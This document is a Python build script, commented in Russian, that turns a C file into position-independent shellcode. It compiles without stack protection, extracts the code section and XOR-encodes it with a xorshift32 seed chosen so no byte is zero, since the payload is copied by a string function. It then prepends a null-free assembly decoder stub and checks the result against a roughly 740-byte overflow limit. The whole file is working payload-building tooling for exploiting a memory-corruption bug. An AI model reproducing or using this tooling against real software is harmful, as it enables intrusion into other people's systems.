"""Сборка полезной нагрузки (Python) - полный цикл из sc_pic.c.

Что делает:
  1. компилирует sc_pic.c без CRT и без проверки стека:
         cl /c /O1 /Os /GS- /Gs- sc_pic.c
  2. линкует с точкой входа прямо в шеллкод:
         link /NODEFAULTLIB /SUBSYSTEM:WINDOWS /ENTRY:shellcode sc.obj
  3. достаёт из готового PE секцию .text - это и есть позиционно-независимый
     код (шеллкод + вспомогательные функции);
  4. кодирует его потоковым шифром xorshift32: компилятор C всё равно выдаёт
     ~9% нулевых байтов, а payload копируется строковой функцией и обрывается
     на первом нуле. Сид подбирается так, чтобы ни один байт не стал нулём;
  5. приписывает впереди декодер на ассемблере (47 байт, тоже без нулей),
     который на месте расшифровывает код и передаёт ему управление;
  6. собирает декодер + блок через NASM и пишет payload_c.bin.

Требуется: MSVC (cl.exe, link.exe) и NASM.
Пути можно задать переменными окружения CL, LINK, NASM.
"""
import glob
import os
import shutil
import struct
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
SRC = os.path.join(HERE, "sc_pic.c")
OUT = os.path.join(HERE, "payload_c.bin")
WORK = os.path.join(HERE, "_build")
NASM_DEFAULT = os.path.join(HERE, "..", "tools", "nasm", "nasm.exe")


def find_tool(name, env_name):
    """Ищет cl.exe / link.exe в Visual Studio, если их нет в PATH."""
    p = os.environ.get(env_name)
    if p and os.path.exists(p):
        return p
    p = shutil.which(name)
    if p:
        return p
    for root in (r"C:\Program Files\Microsoft Visual Studio",
                 r"C:\Program Files (x86)\Microsoft Visual Studio"):
        hits = glob.glob(os.path.join(root, "**", "Hostx64", "x86", name), recursive=True)
        if hits:
            return hits[0]
    raise SystemExit("не найден %s - задайте путь в переменной %s" % (name, env_name))


def extract_text(pe_path):
    """Возвращает содержимое секции .text из PE-файла."""
    d = open(pe_path, 'rb').read()
    e = struct.unpack_from('<I', d, 0x3C)[0]
    coff = e + 4
    machine, nsec, tds, psym, nsym, osz, ch = struct.unpack_from('<HHIIIHH', d, coff)
    opt = coff + 20
    so = opt + osz
    for i in range(nsec):
        o = so + i * 40
        nm = d[o:o + 8].rstrip(b'\x00').decode('latin1')
        vs, va, rs, ra = struct.unpack_from('<IIII', d, o + 8)
        if nm == '.text':
            return d[ra: ra + vs]
    raise SystemExit('.text не найдена')


def keystream(seed, n):
    st = seed & 0xFFFFFFFF
    out = bytearray()
    for _ in range(n):
        st ^= (st << 13) & 0xFFFFFFFF
        st ^= st >> 17
        st ^= (st << 5) & 0xFFFFFFFF
        st &= 0xFFFFFFFF
        out.append(st & 0xFF)
    return out


def find_seed(blob):
    for seed in range(1, 300000):
        ks = keystream(seed, len(blob))
        if all((blob[i] ^ ks[i]) != 0 for i in range(len(blob))):
            return seed, ks
    raise SystemExit('сид не найден')


def seed_code(seed):
    parts = ["    push %d" % (seed & 0xFF), "    pop  ebx"]
    for i in range(1, 4):
        b = (seed >> (8 * i)) & 0xFF
        if b:
            parts += ["    push %d" % b, "    pop  eax",
                      "    shl  eax, %d" % (8 * i), "    or   ebx, eax"]
    return "\n".join(parts)


DECODER = """    mov  esi, esp                               ; начало декодера
    add  esi, {dlen}                            ; -> закодированный блок
    mov  edi, esi
    xor  ecx, ecx
    mov  cx, {blen}                             ; длина блока
{seed}
loop:
    mov  eax, ebx                               ; xorshift32
    shl  eax, 0Dh
    xor  ebx, eax
    mov  eax, ebx
    shr  eax, 11h
    xor  ebx, eax
    mov  eax, ebx
    shl  eax, 5
    xor  ebx, eax
    mov  al, bl
    xor  [edi], al
    inc  edi
    dec  ecx
    jnz  loop
    jmp  esi                                    ; в расшифрованный код
"""


def assemble(nasm, body, out_path):
    asm = os.path.join(WORK, "decoder.asm")
    open(asm, "w", encoding="utf-8").write(
        "BITS 32\n" + body + '\n    incbin "%s"\n' % os.path.join(WORK, "encoded.bin"))
    r = subprocess.run([nasm, '-f', 'bin', '-o', out_path, asm], capture_output=True)
    if r.returncode:
        raise SystemExit("nasm: " + r.stderr.decode('latin1', 'replace'))
    return open(out_path, 'rb').read()


def main():
    cl = find_tool("cl.exe", "CL")
    link = find_tool("link.exe", "LINK")
    nasm = os.environ.get("NASM", NASM_DEFAULT)
    if not os.path.exists(nasm):
        nasm = shutil.which("nasm")
    if not nasm or not os.path.exists(nasm):
        raise SystemExit("не найден NASM - задайте путь в переменной NASM")

    os.makedirs(WORK, exist_ok=True)
    obj = os.path.join(WORK, "sc.obj")
    exe = os.path.join(WORK, "sc.exe")

    print("[1/4] компиляция %s" % os.path.basename(SRC))
    r = subprocess.run([cl, "/nologo", "/c", "/O1", "/Os", "/GS-", "/Gs-",
                        "/Fo" + obj, SRC], capture_output=True, cwd=WORK)
    if r.returncode:
        raise SystemExit("cl: " + r.stdout.decode('latin1', 'replace'))

    print("[2/4] линковка (без CRT, точка входа shellcode)")
    r = subprocess.run([link, "/NOLOGO", "/NODEFAULTLIB", "/SUBSYSTEM:WINDOWS",
                        "/ENTRY:shellcode", "/OUT:" + exe, obj],
                       capture_output=True, cwd=WORK)
    if r.returncode:
        raise SystemExit("link: " + r.stdout.decode('latin1', 'replace'))

    blob = extract_text(exe)
    print("      код: %d байт, нулей %d" % (len(blob), blob.count(0)))

    print("[3/4] кодирование блока (xorshift32)")
    seed, ks = find_seed(blob)
    enc = bytes(blob[i] ^ ks[i] for i in range(len(blob)))
    open(os.path.join(WORK, "encoded.bin"), "wb").write(enc)
    print("      сид %d, нулей в блоке %d" % (seed, enc.count(0)))

    print("[4/4] сборка декодера + блока")
    blen = len(blob)
    tmp = assemble(nasm, "BITS 32\n" + DECODER.format(dlen=0, blen=blen, seed=seed_code(seed)),
                   os.path.join(WORK, "tmp.bin"))
    dlen = len(tmp) - blen
    payload = assemble(nasm, "BITS 32\n" + DECODER.format(dlen=dlen, blen=blen, seed=seed_code(seed)),
                       os.path.join(WORK, "tmp2.bin"))
    open(OUT, "wb").write(payload)

    print()
    print("  декодер : %d байт" % dlen)
    print("  payload : %d байт, нулей %d" % (len(payload), payload.count(0)))
    print("  лимит   : ~740 байт -> %s" % ("ВЛЕЗАЕТ" if len(payload) < 740 else "НЕ ВЛЕЗАЕТ"))
    print("  записан : %s" % OUT)


if __name__ == '__main__':
    main()
